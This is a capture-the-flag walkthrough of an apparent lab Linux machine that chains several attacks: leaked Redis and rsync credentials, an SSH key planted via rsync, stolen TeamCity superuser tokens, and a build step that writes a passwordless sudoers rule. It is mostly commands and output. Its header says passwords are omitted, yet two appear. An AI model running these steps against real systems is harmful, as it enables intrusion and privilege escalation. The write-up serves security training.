## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
VulnNet Entertainment is a company that learns from its mistakes. They quickly realized that they can't make a properly secured web application so they gave up on that idea. Instead, they decided to set up internal services for business purposes. As usual, you're tasked to perform a penetration test of their network and report your findings.  

- Difficulty: Easy/Medium
- Operating System: Linux

This machine was designed to be quite the opposite of the previous machines in this series and it focuses on internal services. It's supposed to show you how you can retrieve interesting information and use it to gain system access. Report your findings by submitting the correct flags.

Note: It _might_ take 3-5 minutes for all the services to boot.
```
## IP-Address
```IP-Address
10.49.139.73
```
## Scan
```bash
PORT      STATE SERVICE     REASON         VERSION
22/tcp    open  ssh         syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 6d:ed:8b:11:ff:2a:b3:52:95:aa:9e:7e:5c:01:ee:df (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDDba7fHtRa1TgL5dLEXhSyIKdFZd0oJPEraRukIvRAIjBbCt23WjvROcwo47nn0vk7uMaIuO3P9HShktErU48hY8EJwCPpYFyzR6ONfp8hJw+ofoHN2bWtu1TS5oxrVG8V314TA56URMbGTMC2/q0OikU+ki0QTlEtfrAwd89xVb1l06y4RtramnJz6J6pe3RO2dj5ZI66aYxQkaHXvqI8QihiMSzhpXvkdAfJEilnpPA000qp2p+25Yh+1TPzLBrHIwpVlfCicxncYJnUjYJANoK3LJ59pm+aGck3Wt8wz12RuoWQR+X8XiBBD9uRgX5hlyMOWq4YFF6QypVAMYd9OBG2u7u1Xq7d6/c/acf4YHzyv5E56lJfueqVkM1ZzKe8QLqx54ryX6WetnStmiTfPILwNV4xXYv1/rT2Ulgj62fw4WLX2bkQ4dl+OZoNznET3RxnHjaYLZhKKIkV3vkrce0cjGyXa2O8soRvN4yuJTa+UT7cza/QVie7Y7VK6J8=
|   256 f8:e8:94:a3:b3:8c:02:a0:e4:c6:e5:3b:0f:76:bb:33 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGyTG4HYcQ+q255pf5nLNUdXQalLQCWnhaVwtpI4tWBDB5Me6CvVHV3IuLLQjygllblaAXurEA5/JhLFwhMRNkc=
|   256 14:1c:66:5a:c8:a9:45:94:1c:40:3d:b8:ae:15:60:33 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJfNJ25+9ZhsoqE6JcbDdVl52ooASDCkO3alV+5ysZ0R
111/tcp   open  rpcbind     syn-ack ttl 62 2-4 (RPC #100000)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
139/tcp   open  netbios-ssn syn-ack ttl 62 Samba smbd 4
445/tcp   open  netbios-ssn syn-ack ttl 62 Samba smbd 4
873/tcp   open  rsync       syn-ack ttl 62 (protocol version 31)
2049/tcp  open  nfs         syn-ack ttl 62 3-4 (RPC #100003)
6379/tcp  open  redis       syn-ack ttl 62 Redis key-value store
33105/tcp open  java-rmi    syn-ack ttl 62 Java RMI
33641/tcp open  mountd      syn-ack ttl 62 1-3 (RPC #100005)
45323/tcp open  nlockmgr    syn-ack ttl 62 1-4 (RPC #100021)
45765/tcp open  mountd      syn-ack ttl 62 1-3 (RPC #100005)
50217/tcp open  mountd      syn-ack ttl 62 1-3 (RPC #100005)
```
## Recon
```bash
$ showmount -e 10.49.139.73
Export list for 10.49.139.73:
/opt/conf *
$ mkdir /mnt/nfs
$ sudo mount -t nfs 10.49.139.73:/opt/conf /mnt/nfs
$ ls -la /mnt/nfs
$ tree . 
├── hp │   
	└── hplip.conf 
├── init │   
	├── anacron.conf │   
	├── lightdm.conf │   
	└── whoopsie.conf 
├── opt 
├── profile.d │   
	├── bash_completion.sh │   
	├── cedilla-portuguese.sh │   
	├── input-method-config.sh │   
	└── vte-2.91.sh 
├── redis │   
	└── redis.conf 
├── vim │   
	├── vimrc │   
	└── vimrc.tiny 
└── wildmidi 
	└── wildmidi.cfg
```
- Redis Config Exposed
```bash
$ cat /mnt/nfs/redis/redis.conf | grep requirepass
# If the master is password protected (using the "requirepass" configuration
requirepass "B65Hx562F@ggAZ@F"
# requirepass foobared
```
- Login `Redis`
```bash
$ redis-cli -h 10.49.139.73 -a 'B65Hx562F@ggAZ@F'
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
10.49.139.73:6379> CONFIG GET dir
1) "dir"
2) "/var/lib/redis"
   
10.49.139.73:6379> CONFIG GET dbfilename
3) "dbfilename"
4) "dump.rdb"
```
- Download `dump.rdb`
```bash
$ redis-cli -h 10.49.139.73 -a 'B65Hx562F@ggAZ@F' --rdb dump.rdb
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
sending REPLCONF capa eof
sending REPLCONF rdb-only 1
REPLCONF rdb-only error: ERR Unrecognized REPLCONF option: rdb-only
SYNC sent to master, writing 557 bytes to 'dump.rdb'
Transfer finished with success.

$ strings dump.rdb
REDIS0009
	redis-ver
5.0.7
redis-bits
ctime
used-mem
repl-stream-db
repl-id(9acf025cad94479e175e57bf66996de15cab3f07
repl-offset
aof-preamble
internal flag%[flag omitted]
authlist
@pQXV0aG9yaXphdGlvbiBmb3IgcnN
5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4
wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzN
IUDY3QFRXQEJjNzJ2Cg==s
10 20 30 40 50
temp dir...
marketlist
Machine Learning
Penetration Testing
Programming
Data Analysis
	Analytics
	Marketing
Media Streaming
```
- Flag
```Flag
[flag omitted]
```
- also there is `base64` code
```bash
$ echo 'QXV0aG9yaXphdGlvbiBmb3IgcnN5bmM6Ly9yc3luYy1jb25uZWN0QDEyNy4wLjAuMSB3aXRoIHBhc3N3b3JkIEhjZzNIUDY3QFRXQEJjNzJ2Cg==' | base64 -d
Authorization for rsync://rsync-connect@127.0.0.1 with password Hcg3HP67@TW@Bc72v
```
- let's connect via rsync
```bash
$ rsync rsync://rsync-connect@10.49.139.73
files          	Necessary home interaction  
$ rsync -av rsync://rsync-connect@10.49.139.73/files ./loot
$ cd loot
$ tree
.
├── ssm-user
├── sys-internal
│   ├── Desktop
│   ├── Documents
│   ├── Downloads
│   ├── Music
│   ├── Pictures
│   ├── Public
│   ├── Templates
│   ├── user.txt
│   └── Videos
└── ubuntu

12 directories, 1 file
$ cd sys-internal
$ cat user.txt
[flag omitted]
```
- Flag
```Flag
[flag omitted]
```
- SMB
```bash
$ smbclient -L //10.49.139.73 -N

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	shares          Disk      VulnNet Business Shares
	IPC$            IPC       IPC Service (ip-10-49-139-73 server (Samba, Ubuntu))
```
- Got the SMB-Share
```bash
smbclient //10.49.139.73/shares -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Feb  2 04:20:09 2021
  ..                                  D        0  Tue Feb  2 04:28:11 2021
  temp                                D        0  Sat Feb  6 06:45:10 2021
  data                                D        0  Tue Feb  2 04:27:33 2021

		15376180 blocks of size 1024. 2265364 blocks available
smb: \> cd temp
smb: \temp\> ls
  .                                   D        0  Sat Feb  6 06:45:10 2021
  ..                                  D        0  Tue Feb  2 04:20:09 2021
  services.txt                        N       38  Sat Feb  6 06:45:09 2021

		15376180 blocks of size 1024. 2265364 blocks available
smb: \temp\> get service.txt
NT_STATUS_OBJECT_NAME_NOT_FOUND opening remote file \temp\service.txt
smb: \temp\> GET services.txt
getting file \temp\services.txt of size 38 as services.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \temp\> cd ..
smb: \> ls
  .                                   D        0  Tue Feb  2 04:20:09 2021
  ..                                  D        0  Tue Feb  2 04:28:11 2021
  temp                                D        0  Sat Feb  6 06:45:10 2021
  data                                D        0  Tue Feb  2 04:27:33 2021

		15376180 blocks of size 1024. 2265364 blocks available
smb: \> cd data
smb: \data\> ls
  .                                   D        0  Tue Feb  2 04:27:33 2021
  ..                                  D        0  Tue Feb  2 04:20:09 2021
  data.txt                            N       48  Tue Feb  2 04:21:18 2021
  business-req.txt                    N      190  Tue Feb  2 04:27:33 2021

		15376180 blocks of size 1024. 2265364 blocks available
smb: \data\> GET data.txt
getting file \data\data.txt of size 48 as data.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \data\> GET business-req.txt
getting file \data\business-req.txt of size 190 as business-req.txt (1.3 KiloBytes/sec) (average 0.6 KiloBytes/sec)
smb: \data\>
```
- Files Content - `services.txt`
```bash
$ cat services.txt
[flag omitted]
```
- Another Flag
```Flag
[flag omitted]
```
- File Content - `data.txt` & `business-req.txt`
```bash
$ cat data.txt
Purge regularly data that is not needed anymore

$ cat business-req.txt
We just wanted to remind you that we’re waiting for the DOCUMENT you agreed to send us so we can complete the TRANSACTION we discussed.
If you have any questions, please text or phone us.
```
- Let's upload `public key` via `rsync`
```bash
$ rsync -v ~/.ssh/id_ed25519.pub \
rsync://rsync-connect@10.49.139.73/files/sys-internal/.ssh/authorized_keys
Password: [password omitted]
```
- Let's Login:
```bash
$ ssh -i .ssh/id_ed25519 sys-internal@10.49.139.73
$ whoami
sys-internal
$ id
uid=1000(sys-internal) gid=1000(sys-internal) groups=1000(sys-internal),24(cdrom)
```
- services running on Machine
```bash
sys-internal@ip-10-49-139-73:~$ ss -tulnp
Netid  State   Recv-Q  Send-Q          Local Address:Port      Peer Address:Port  Process
udp    UNCONN  0       0              0.0.0.0:42811          0.0.0.0:*
udp    UNCONN  0       0               0.0.0.0:2049           0.0.0.0:*
udp    UNCONN  0       0              127.0.0.53%lo:53             0.0.0.0:*
udp    UNCONN  0       0             10.49.139.73%ens5:68             0.0.0.0:*
udp    UNCONN  0       0                     0.0.0.0:111            0.0.0.0:*
udp    UNCONN  0       0               10.49.191.255:137            0.0.0.0:*
udp    UNCONN  0       0                10.49.139.73:137            0.0.0.0:*
udp    UNCONN  0       0                     0.0.0.0:137            0.0.0.0:*
udp    UNCONN  0       0               10.49.191.255:138            0.0.0.0:*
udp    UNCONN  0       0                10.49.139.73:138            0.0.0.0:*
udp    UNCONN  0       0                     0.0.0.0:138            0.0.0.0:*
udp    UNCONN  0       0                     0.0.0.0:45790          0.0.0.0:*
udp    UNCONN  0       0                     0.0.0.0:5353           0.0.0.0:*
udp    UNCONN  0       0                     0.0.0.0:36174          0.0.0.0:*
udp    UNCONN  0       0                     0.0.0.0:54690          0.0.0.0:*
udp    UNCONN  0       0                     0.0.0.0:40445          0.0.0.0:*
udp    UNCONN  0       0                        [::]:2049              [::]:*
udp    UNCONN  0       0                        [::]:111               [::]:*
udp    UNCONN  0       0                        [::]:47906             [::]:*
udp    UNCONN  0       0                        [::]:37819             [::]:*
udp    UNCONN  0       0                        [::]:60366             [::]:*
udp    UNCONN  0       0                        [::]:33898             [::]:*
udp    UNCONN  0       0                        [::]:5353              [::]:*
udp    UNCONN  0       0                        [::]:58608             [::]:*
tcp    LISTEN  0       4096                  0.0.0.0:111            0.0.0.0:*
tcp    LISTEN  0       128                   0.0.0.0:22             0.0.0.0:*
tcp    LISTEN  0       64                    0.0.0.0:2049           0.0.0.0:*
tcp    LISTEN  0       511                   0.0.0.0:6379           0.0.0.0:*
tcp    LISTEN  0       50                    0.0.0.0:139            0.0.0.0:*
tcp    LISTEN  0       4096            127.0.0.53%lo:53             0.0.0.0:*
tcp    LISTEN  0       64                    0.0.0.0:45323          0.0.0.0:*
tcp    LISTEN  0       50                    0.0.0.0:445            0.0.0.0:*
tcp    LISTEN  0       4096                  0.0.0.0:45765          0.0.0.0:*
tcp    LISTEN  0       5                     0.0.0.0:873            0.0.0.0:*
tcp    LISTEN  0       4096                  0.0.0.0:33641          0.0.0.0:*
tcp    LISTEN  0       5                   127.0.0.1:631            0.0.0.0:*
tcp    LISTEN  0       4096                  0.0.0.0:50217          0.0.0.0:*
tcp    LISTEN  0       4096                     [::]:111               [::]:*
tcp    LISTEN  0       4096                     [::]:59453             [::]:*
tcp    LISTEN  0       128                      [::]:22                [::]:*
tcp    LISTEN  0       64                       [::]:2049              [::]:*
tcp    LISTEN  0       4096                     [::]:45311             [::]:*
tcp    LISTEN  0       5                       [::1]:631               [::]:*
tcp    LISTEN  0       50                       [::]:139               [::]:*
tcp    LISTEN  0       50                          *:33105                *:*
tcp    LISTEN  0       64                       [::]:41229             [::]:*
tcp    LISTEN  0       50                       [::]:445               [::]:*
tcp    LISTEN  0       4096                     [::]:33321             [::]:*
tcp    LISTEN  0       511                     [::1]:6379              [::]:*
tcp    LISTEN  0       5                        [::]:873               [::]:*
tcp    LISTEN  0       50         [::ffff:127.0.0.1]:51888                *:*
tcp    LISTEN  0       50                          *:9090                 *:*
tcp    LISTEN  0       100        [::ffff:127.0.0.1]:8111                 *:*
tcp    LISTEN  0       1          [::ffff:127.0.0.1]:8105                 *:*
```
- Got Something
```bash
$ ls
bin   etc         initrd.img.old  lost+found  opt   run   srv       TeamCity  var
```
- Found a Directory named `TeamCity`
```bash
$ ls
bin          conf        licenses            TeamCity-readme.txt  webapps
BUILD_85899  devPackage  logs                temp                 work
buildAgent   lib         service.properties  Tomcat-running.txt
$cd conf
$ ls
Catalina              log4j.dtd                       teamcity-server-log4j.xml.dist
catalina.policy       logging.properties              teamcity-server-service.xml
catalina.properties   server-https-proxy.xml          teamcity-startup.properties
context.xml           server.xml                      tomcat-users.xml
jaspic-providers.xml  teamcity-maintenance-log4j.xml  tomcat-users.xsd
jaspic-providers.xsd  teamcity-server-log4j.xml       web.xml
```
- we already know service running on port 8111
- let's Forward port to own machine using `SSH`
```bash
$ ssh -i .ssh/id_ed25519 -L 8111:127.0.0.1:8111 sys-internal@10.49.139.73
```
- After Port Forwarding, Access `127.0.0.1:8111` and Got the `TeamCity-Login` page with `SuperUser` Login Page
- For `SuperUser` Login need `Token`, Lets Search inside `TeamCity` Folder 
```bash
sys-internal@ip-10-49-139-73:/TeamCity$ grep -ri token /TeamCity/logs/ 2>/dev/null
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 8446629153054945175 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 3782562599667957776 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 5812627377764625872 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 8494139184482786852 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 9112682479416228733 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 1184781491476205032 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 1766718408916667047 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 6814109504103369770 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 6814109504103369770 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 6814109504103369770 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 6814109504103369770 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 6814109504103369770 (use empty username with the token as the password to access the server)
/TeamCity/logs/catalina.out:[TeamCity] Super user authentication token: 6814109504103369770 (use empty username with the token as the password to access the server)
```
- Got  Login Authorization Token 
```Token
1. 8446629153054945175
2. 3782562599667957776
3. 5812627377764625872
4. 8494139184482786852
5. 9112682479416228733
6. 1184781491476205032
7. 1766718408916667047
8. 6814109504103369770
```
- Working Authorization Token `6814109504103369770`
- Login as Super user and create a project 
- After creating project in `Customs Script` add
```bash
echo "sys-internal ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
```
- It will run as `sudo` and give give sys-internal absolute Permission
```bash
sys-internal@ip-10-49-143-236:/TeamCity$ id
uid=1000(sys-internal) gid=1000(sys-internal) groups=1000(sys-internal),24(cdrom)
sys-internal@ip-10-49-143-236:/TeamCity$ sudo -l
Matching Defaults entries for sys-internal on ip-10-49-143-236:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sys-internal may run the following commands on ip-10-49-143-236:
    (ALL) NOPASSWD: ALL
sys-internal@ip-10-49-143-236:/TeamCity$ cat /root/root.txt
cat: /root/root.txt: Permission denied
sys-internal@ip-10-49-143-236:/TeamCity$ sudo cat /root/root.txt
[flag omitted]
```
# END